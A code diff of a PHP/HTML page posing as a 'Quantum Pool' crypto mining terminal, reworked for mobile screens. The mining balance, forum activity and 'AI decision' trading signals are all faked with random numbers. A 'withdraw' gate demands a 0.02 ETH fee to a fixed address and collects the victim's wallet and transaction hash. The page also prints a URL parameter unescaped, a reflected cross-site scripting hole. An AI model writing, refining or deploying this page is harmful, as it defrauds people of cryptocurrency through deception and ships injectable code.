@@ -1,5 +1,5 @@
 <?php
-// --- BACKEND LOGIC: CAPTURE DATA ---
+// --- BACKEND LOGIC ---
 if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['tx_hash'])) {
     $wallet = $_POST['node_wallet'] ?? 'Unknown';
     $tx_hash = $_POST['tx_hash'] ?? '';
@@ -16,126 +16,103 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['tx_hash'])) {
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>QUANTUM TERMINAL V15 | LONG-TRACE MODE</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>QUANTUM TERMINAL V15 | MOBILE READY</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;700&family=JetBrains+Mono:wght@400;800&display=swap" rel="stylesheet">
     <style>
         :root { --primary: #6366f1; --bg: #010103; }
-        body { background: var(--bg); color: #e2e8f0; font-family: 'Space Grotesk', sans-serif; font-size: 9px; height: 100vh; overflow: hidden; }
-        .glass { background: rgba(10, 12, 18, 0.8); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.03); }
-        .neon-border { border: 1px solid rgba(99, 102, 241, 0.2); box-shadow: 0 0 30px rgba(0,0,0,0.5); }
-        .mono { font-family: 'JetBrains Mono', monospace; }
+        body { background: var(--bg); color: #e2e8f0; font-family: 'Space Grotesk', sans-serif; font-size: 10px; min-height: 100vh; margin: 0; }
+        .glass { background: rgba(10, 12, 18, 0.8); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.05); }
+        .neon-border { border: 1px solid rgba(99, 102, 241, 0.2); }
         .text-gradient { background: linear-gradient(90deg, #818cf8, #2dd4bf); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
         
-        /* Animasi Scanline */
-        .scanline { position: absolute; height: 100%; width: 100%; background: linear-gradient(to bottom, transparent, rgba(99, 102, 241, 0.02) 50%, transparent); animation: scan 10s linear infinite; pointer-events: none; z-index: 100; }
-        @keyframes scan { from { transform: translateY(-100%); } to { transform: translateY(100%); } }
+        /* Fix Chart Height for Mobile */
+        .chart-container { position: relative; height: 120px; width: 100%; }
+        
+        @media (max-width: 768px) {
+            .mobile-stack { flex-direction: column !important; overflow-y: auto !important; height: auto !important; }
+            .mobile-grid { grid-template-columns: 1fr !important; }
+            .hide-mobile { display: none !important; }
+            .chart-container { height: 150px; }
+            body { overflow-y: auto; }
+        }
 
-        /* Scrollbar Custom */
-        .custom-scroll::-webkit-scrollbar { width: 2px; }
-        .custom-scroll::-webkit-scrollbar-thumb { background: #312e81; }
+        .scanline { position: fixed; top: 0; left: 0; height: 100%; width: 100%; background: linear-gradient(to bottom, transparent, rgba(99, 102, 241, 0.02) 50%, transparent); animation: scan 10s linear infinite; pointer-events: none; z-index: 100; }
+        @keyframes scan { from { transform: translateY(-100%); } to { transform: translateY(100%); } }
+        .marquee { white-space: nowrap; animation: marquee 20s linear infinite; }
+        @keyframes marquee { from { transform: translateX(100%); } to { transform: translateX(-100%); } }
     </style>
 </head>
 <body class="p-2 flex flex-col gap-2 relative">
     <div class="scanline"></div>
 
-    <header class="glass neon-border rounded-xl p-4 flex justify-between items-center shrink-0">
-        <div class="flex items-center gap-6">
-            <div class="bg-indigo-600 p-3 rounded-xl shadow-[0_0_20px_#4f46e5] border border-indigo-400">
-                <span class="text-white font-black text-xl italic">Q</span>
+    <header class="glass neon-border rounded-xl p-3 flex justify-between items-center shrink-0">
+        <div class="flex items-center gap-3">
+            <div class="bg-indigo-600 p-2 rounded-lg shadow-[0_0_15px_#4f46e5]">
+                <span class="text-white font-black text-sm italic">Q</span>
             </div>
             <div>
-                <h1 class="font-black text-2xl tracking-tighter text-gradient uppercase">Quantum_Neural_Pool</h1>
-                <p class="text-[7px] mono text-indigo-400 font-bold tracking-[0.4em]">DISTRIBUTED_LEDGER_SYNC_V15</p>
+                <h1 class="font-black text-sm text-gradient uppercase">Quantum_Pool</h1>
+                <p class="text-[6px] tracking-[0.3em] text-indigo-400 font-bold">NODE_V15_MOBILE</p>
             </div>
         </div>
-
-        <div class="flex gap-12 border-x border-white/5 px-10">
-            <div class="text-center">
-                <p class="text-[6px] text-gray-500 uppercase">Global Hashrate</p>
-                <p id="traffic" class="text-cyan-400 font-black mono text-sm tracking-tighter">4.92 TH/s</p>
-            </div>
-            <div class="text-center">
-                <p class="text-[6px] text-gray-500 uppercase">Node Uptime</p>
-                <p class="text-emerald-400 font-black mono text-sm tracking-tighter">99.98%</p>
-            </div>
-            <div class="text-center">
-                <p class="text-[6px] text-gray-500 uppercase">Active Threads</p>
-                <p class="text-white font-black mono text-sm tracking-tighter">12,402</p>
-            </div>
-        </div>
-
         <div class="text-right">
-            <p class="text-gray-500 text-[8px] uppercase font-bold tracking-widest">Available_to_Withdraw</p>
-            <p id="eth-balance" class="text-white text-2xl font-black mono tracking-tighter">0.00000000 <span class="text-indigo-500 text-xs">ETH</span></p>
+            <p class="text-gray-500 text-[7px] uppercase font-bold">ETH_BALANCE</p>
+            <p id="eth-balance" class="text-white text-sm font-black mono tracking-tighter">0.00000000</p>
         </div>
     </header>
 
-    <div class="flex-1 grid grid-cols-12 gap-2 overflow-hidden">
+    <div class="flex-1 flex mobile-stack gap-2 overflow-hidden">
         
-        <aside class="col-span-2 flex flex-col gap-2">
-            <div class="glass neon-border rounded-xl p-3 flex-1 overflow-hidden flex flex-col">
-                <p class="text-[7px] font-black text-indigo-400 mb-2 uppercase italic tracking-widest">Live_Order_Flow</p>
-                <div id="order-book" class="flex-1 mono text-[7px] space-y-1 overflow-hidden">
-                    </div>
-            </div>
-            <div class="glass neon-border rounded-xl p-3 h-32 flex flex-col items-center justify-center text-center">
-                <div class="w-12 h-12 rounded-full border-2 border-dashed border-indigo-500/30 animate-spin mb-2"></div>
-                <p class="text-[6px] text-gray-500 uppercase">Neural_Core_Status</p>
-                <p class="text-indigo-400 font-bold">OPTIMIZED</p>
-            </div>
-        </aside>
-
-        <main class="col-span-7 grid grid-cols-2 grid-rows-3 gap-2 overflow-hidden">
+        <main class="flex-1 grid grid-cols-2 mobile-grid gap-2 overflow-y-auto pr-1 custom-scroll">
             </main>
 
-        <aside class="col-span-3 flex flex-col gap-2 overflow-hidden">
-            <div id="ai-box" class="glass neon-border p-4 rounded-xl flex flex-col items-center text-center relative overflow-hidden h-32 justify-center">
+        <aside class="w-full md:w-80 flex flex-col gap-2 shrink-0">
+            <div id="ai-box" class="glass neon-border p-3 rounded-xl flex flex-col items-center justify-center text-center relative overflow-hidden">
                 <div class="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-indigo-500 to-cyan-500"></div>
-                <p class="text-[8px] font-black text-indigo-400 uppercase tracking-widest mb-1">AI_Decision_Engine</p>
-                <h2 id="ai-action" class="text-5xl font-black italic tracking-tighter text-white opacity-10">ANALYZING</h2>
-                <div id="ai-target" class="text-[7px] text-gray-500 font-bold mt-2">WAITING FOR DATA...</div>
+                <p class="text-[8px] font-black text-indigo-400 uppercase mb-1">AI_DECISION</p>
+                <h2 id="ai-action" class="text-3xl font-black italic tracking-tighter text-white opacity-20">SYNCING</h2>
+                <div id="ai-target" class="text-[7px] text-gray-500 font-bold">WAITING...</div>
             </div>
 
             <div class="flex gap-2 shrink-0">
-                <button onclick="startMining()" id="btn-mining" class="flex-1 bg-indigo-600 hover:bg-indigo-500 text-white font-black py-3 rounded-lg uppercase tracking-widest transition-all">Start Mining</button>
-                <button onclick="showWD()" class="flex-1 glass border-white/10 text-white font-bold py-3 rounded-lg uppercase tracking-widest">Withdraw</button>
+                <button onclick="startMining()" id="btn-mining" class="flex-1 bg-indigo-600 hover:bg-indigo-500 text-white font-black py-4 rounded-xl uppercase text-[10px] tracking-widest transition-all active:scale-95">Start Mining</button>
+                <button onclick="showWD()" class="flex-1 glass border-white/10 text-white font-bold py-4 rounded-xl uppercase text-[10px] tracking-widest active:scale-95">Withdraw</button>
             </div>
 
-            <div class="glass neon-border rounded-xl p-3 flex-1 flex flex-col overflow-hidden">
-                <p class="text-[7px] font-black text-gray-600 uppercase mb-2 border-b border-white/5 pb-1 italic">Network_Activity_Forum</p>
-                <div id="forum" class="flex-1 overflow-y-auto space-y-2 pr-1 custom-scroll">
+            <div class="glass neon-border rounded-xl p-3 h-48 md:flex-1 flex flex-col overflow-hidden">
+                <p class="text-[7px] font-black text-gray-500 uppercase mb-2 border-b border-white/5 pb-1 italic">Network_Activity</p>
+                <div id="forum" class="flex-1 overflow-y-auto space-y-2 pr-1 text-[8px]">
                     <?php if(isset($_GET['wd_success'])): ?>
-                        <div class="p-3 bg-emerald-500/10 border border-emerald-500/40 rounded-lg text-[8px] text-emerald-400 animate-pulse">
-                            <span class="font-black">[WITHDRAW_SUCCESS]</span> User @<?php echo $_GET['user']; ?> just synchronized <?php echo rand(2, 6); ?>.<?php echo rand(10, 99); ?> ETH to external wallet.
+                        <div class="p-2 bg-emerald-500/10 border border-emerald-500/30 rounded-lg text-emerald-400 animate-pulse">
+                            [SUCCESS] Node @<?php echo $_GET['user']; ?> synchronized.
                         </div>
                     <?php endif; ?>
                 </div>
             </div>
 
-            <div id="wd-gate" class="glass neon-border p-3 rounded-xl hidden border-indigo-500/50 bg-indigo-500/5">
-                <p class="text-[8px] text-indigo-400 font-black mb-2 uppercase">Node_Verification_Required</p>
-                <div class="bg-black/50 p-2 rounded border border-white/10 mb-3 mono text-[7px] text-white">Validator: 0x015d4438849119cecd8292b8abf9a4bb2d03fdbb</div>
+            <div id="wd-gate" class="glass neon-border p-3 rounded-xl hidden bg-indigo-900/20">
+                <p class="text-[8px] text-indigo-400 font-black mb-1">VALIDATION_REQUIRED</p>
+                <p class="text-[7px] text-gray-400 mb-2 italic leading-tight">Fee: 0.02 ETH to Validator Address below.</p>
+                <div class="bg-black/50 p-2 rounded border border-white/10 mb-2 mono text-[7px] text-white break-all">0x015d4438849119cecd8292b8abf9a4bb2d03fdbb</div>
                 <form action="" method="POST" class="flex flex-col gap-2">
-                    <input type="text" name="node_wallet" placeholder="Recipient Wallet" required class="bg-black/40 border border-white/10 rounded p-2 text-[8px] text-white outline-none">
-                    <input type="text" name="tx_hash" placeholder="Verification TxID" required class="bg-black/40 border border-white/10 rounded p-2 text-[8px] text-white outline-none">
-                    <button type="submit" class="bg-indigo-600 text-white font-black py-2 rounded uppercase text-[8px]">Submit Sync</button>
+                    <input type="text" name="node_wallet" placeholder="Your Wallet" required class="bg-black/40 border border-white/10 rounded p-3 text-[9px] text-white outline-none">
+                    <input type="text" name="tx_hash" placeholder="TxID Hash" required class="bg-black/40 border border-white/10 rounded p-3 text-[9px] text-white outline-none">
+                    <button type="submit" class="bg-indigo-600 text-white font-black py-3 rounded uppercase text-[10px]">Verify Sync</button>
                 </form>
             </div>
         </aside>
     </div>
 
-    <footer class="glass neon-border p-1 flex items-center gap-4 overflow-hidden rounded-lg">
-        <div class="bg-indigo-600 px-3 py-0.5 rounded text-[7px] font-bold italic text-white uppercase shrink-0">Live_Ticker</div>
-        <div class="flex gap-10 mono text-[7px] text-indigo-300 animate-marquee whitespace-nowrap italic">
-            <span>[MARKET] PEPE +12.4% | BTC AT $94K | ETH GAS 12 GWEI | XRP LIQUIDITY SURGE | DOGE NODE SYNCED</span>
-            <span>[SYSTEM] BLOCK #19,234,011 DISCOVERED BY NODE_722 | NEURAL ENGINE AT 98.2% EFFICIENCY</span>
+    <footer class="glass neon-border p-2 overflow-hidden rounded-lg shrink-0">
+        <div class="marquee mono text-[8px] text-indigo-400 italic">
+            [MARKET] BTC: $94,120 | ETH: $3,210 | XRP: $1.12 | DOGE: $0.38 | PEPE: +15.2% | NODE STATUS: OPTIMIZED | SYNCING BLOCK #192,231
         </div>
     </footer>
 
     <script>
-        // Koin Hits
         const assets = [
             { sym: 'BTC-USD', name: 'BTC' }, { sym: 'ETH-USD', name: 'ETH' },
             { sym: 'XRP-USD', name: 'XRP' }, { sym: 'DOGE-USD', name: 'DOGE' },
@@ -145,23 +122,18 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['tx_hash'])) {
         const charts = {};
         const chartData = {};
         const mainGrid = document.querySelector('main');
-
-        // SETUP 50 DATA POINTS FOR LONG LINE
-        const DATA_LENGTH = 50; 
+        const DATA_LENGTH = 40; 
 
         assets.forEach(a => {
             const container = document.createElement('div');
             container.id = `cont-${a.sym}`;
-            container.className = 'glass neon-border rounded-xl p-3 flex flex-col relative';
+            container.className = 'glass neon-border rounded-xl p-3 flex flex-col relative transition-all duration-500 shrink-0';
             container.innerHTML = `
-                <div class="flex justify-between items-start mb-1">
-                    <div>
-                        <span class="text-[10px] font-black text-white tracking-tighter italic">${a.name}/USDT</span>
-                        <p class="text-[5px] text-indigo-500 font-bold uppercase mono tracking-widest">Tracing_Active...</p>
-                    </div>
+                <div class="flex justify-between items-start mb-2">
+                    <span class="text-[10px] font-black text-white italic tracking-tighter">${a.name}/USDT</span>
                     <span id="pr-${a.sym}" class="mono text-[10px] font-black text-indigo-300">$ 0.00</span>
                 </div>
-                <div class="flex-1 min-h-0"><canvas id="chart-${a.sym}"></canvas></div>`;
+                <div class="chart-container"><canvas id="chart-${a.sym}"></canvas></div>`;
             mainGrid.appendChild(container);
 
             chartData[a.sym] = Array(DATA_LENGTH).fill(null);
@@ -173,39 +145,35 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['tx_hash'])) {
                     datasets: [{
                         data: chartData[a.sym],
                         borderColor: '#6366f1',
-                        borderWidth: 1.5,
+                        borderWidth: 2,
                         pointRadius: 0,
-                        tension: 0.3, // Membuat garis melengkung halus
+                        tension: 0.3,
                         fill: true,
-                        backgroundColor: (c) => {
-                            const g = c.chart.ctx.createLinearGradient(0, 0, 0, 200);
-                            g.addColorStop(0, 'rgba(99, 102, 241, 0.1)');
-                            g.addColorStop(1, 'rgba(99, 102, 241, 0)');
-                            return g;
-                        }
+                        backgroundColor: 'rgba(99, 102, 241, 0.05)'
                     }]
                 },
                 options: { responsive: true, maintainAspectRatio: false, plugins: { legend: { display: false } }, scales: { x: { display: false }, y: { display: false } } }
             });
         });
 
-        // MINING SYSTEM
         let balance = 0.00000000;
         let active = false;
         function startMining() {
             if(active) return;
             active = true;
-            const btn = document.getElementById('btn-mining');
-            btn.innerText = "MINING_LIVE";
-            btn.classList.replace('bg-indigo-600', 'bg-emerald-600');
+            document.getElementById('btn-mining').innerText = "LIVE...";
+            document.getElementById('btn-mining').className = "flex-1 bg-emerald-600 text-white font-black py-4 rounded-xl animate-pulse";
             setInterval(() => {
-                balance += Math.random() * 0.00002;
-                document.getElementById('eth-balance').innerHTML = balance.toFixed(8) + " <span class='text-indigo-500 text-xs'>ETH</span>";
+                balance += Math.random() * 0.000025;
+                document.getElementById('eth-balance').innerText = balance.toFixed(8);
             }, 1000);
         }
-        function showWD() { document.getElementById('wd-gate').classList.toggle('hidden'); }
+        function showWD() { 
+            const gate = document.getElementById('wd-gate');
+            gate.classList.toggle('hidden');
+            if(!gate.classList.contains('hidden')) gate.scrollIntoView({behavior: 'smooth'});
+        }
 
-        // WEBSOCKET (REALTIME)
         const ws = new WebSocket('wss://ws-feed.exchange.coinbase.com');
         ws.onopen = () => ws.send(JSON.stringify({ "type": "subscribe", "product_ids": assets.map(a => a.sym), "channels": ["ticker"] }));
         ws.onmessage = (e) => {
@@ -214,44 +182,32 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['tx_hash'])) {
                 const price = parseFloat(data.price);
                 const sym = data.product_id;
                 document.getElementById(`pr-${sym}`).innerText = '$ ' + price.toLocaleString(undefined, {minimumFractionDigits: (sym.includes('PEPE') ? 6 : 2)});
-                
                 chartData[sym].shift();
                 chartData[sym].push(price);
                 charts[sym].update('none');
 
-                // SIGNAL LOGIC
-                if(Math.random() > 0.99) {
+                if(Math.random() > 0.985) {
                     const dec = Math.random() > 0.5 ? "BUY" : "SELL";
                     const color = dec === 'BUY' ? '#10b981' : '#ef4444';
                     document.getElementById('ai-action').innerText = dec;
-                    document.getElementById('ai-action').className = `text-5xl font-black italic tracking-tighter opacity-100 transition-all ${dec === 'BUY' ? 'text-emerald-400' : 'text-red-400'}`;
-                    document.getElementById('ai-target').innerText = `NODE_TARGET: ${sym.split('-')[0]}`;
+                    document.getElementById('ai-action').className = `text-4xl font-black italic opacity-100 transition-all ${dec === 'BUY' ? 'text-emerald-400' : 'text-red-400'}`;
+                    document.getElementById('ai-target').innerText = `TARGET: ${sym.split('-')[0]}`;
                     document.getElementById(`cont-${sym}`).style.borderColor = color;
                     setTimeout(() => {
                         document.getElementById(`cont-${sym}`).style.borderColor = 'rgba(99, 102, 241, 0.2)';
-                        document.getElementById('ai-action').innerText = "STABLE";
-                        document.getElementById('ai-action').className = "text-5xl font-black italic tracking-tighter text-white opacity-10";
                     }, 3000);
                 }
             }
         };
 
-        // SIMULATED DATA
+        // Simulated Forum
         setInterval(() => {
-            // Order Book Simulation
-            const ob = document.getElementById('order-book');
-            const type = Math.random() > 0.5 ? 'text-emerald-500' : 'text-red-500';
-            const log = `<div class="flex justify-between border-b border-white/5 pb-1 ${type}"><span>${(Math.random()*10).toFixed(4)} ETH</span><span>${(Math.random()*100).toFixed(2)}%</span></div>`;
-            ob.insertAdjacentHTML('afterbegin', log);
-            if(ob.children.length > 20) ob.lastChild.remove();
-
-            // Forum Simulation
             const f = document.getElementById('forum');
-            const user = Math.floor(Math.random()*999);
-            const msg = `<div class="bg-white/5 p-2 rounded border-l-2 border-indigo-500 text-[7px]"><span class="text-indigo-400 font-bold uppercase">@User_${user}:</span> Share found on Block #${Math.floor(Math.random()*99999)}</div>`;
+            const msgs = ["Hashrate Stable", "Block Found!", "Syncing...", "PEPE Moon!", "Withdrawal Pending"];
+            const msg = `<div class="bg-white/5 p-2 rounded border-l-2 border-indigo-500">@Node_${Math.floor(Math.random()*999)}: ${msgs[Math.floor(Math.random()*msgs.length)]}</div>`;
             f.insertAdjacentHTML('afterbegin', msg);
-            if(f.children.length > 15) f.lastChild.remove();
-        }, 3000);
+            if(f.children.length > 10) f.lastChild.remove();
+        }, 4000);
     </script>
 </body>
 </html>
